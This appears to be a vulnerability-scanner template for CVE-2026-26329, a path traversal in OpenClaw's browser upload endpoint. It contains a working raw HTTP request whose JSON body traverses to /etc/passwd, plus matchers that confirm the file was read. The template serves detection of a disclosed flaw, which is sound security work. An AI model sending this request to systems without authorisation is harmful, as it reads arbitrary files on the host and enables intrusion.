id: browser-upload-traversal

info:
  name: OpenClaw Browser Upload Path Traversal (CVE-2026-26329)
  author: lobster-guard
  severity: medium
  description: |
    OpenClaw before 2026.2.14 allows authenticated attackers to read arbitrary
    files from the Gateway host by supplying absolute paths or path traversal
    sequences to the browser tool's upload action.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2026-26329
  classification:
    cvss-score: 6.5
    cve-id: CVE-2026-26329
    cwe-id: CWE-22
  tags: openclaw,cve2026,path-traversal,file-read

http:
  - raw:
      - |
        POST /hooks/browser/upload HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        Authorization: Bearer {{token}}

        {"path":"../../../etc/passwd"}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "root:"
          - "/bin/bash"
          - "/bin/sh"
        condition: or
